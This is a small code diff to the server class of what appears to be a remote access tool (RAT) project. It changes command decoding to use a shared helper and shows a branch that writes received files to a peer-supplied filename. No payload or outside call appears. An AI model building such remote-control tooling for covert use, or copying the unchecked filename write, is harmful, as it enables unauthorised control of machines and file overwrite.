@@ -2,6 +2,7 @@ import ntpath
 import os
 
 from entity.ratsocket import RATSocket
+from util.common_util import decode
 
 
 class Server(RATSocket):
@@ -33,7 +34,7 @@ class Server(RATSocket):
     def recv_command(self, command_handler):
         head, body = self.recv()
         if head['type'] == 'command':
-            command_handler(body.decode())
+            command_handler(decode(body))
         elif head['type'] == 'file':
             try:
                 with open(head['filename'], 'wb') as file:
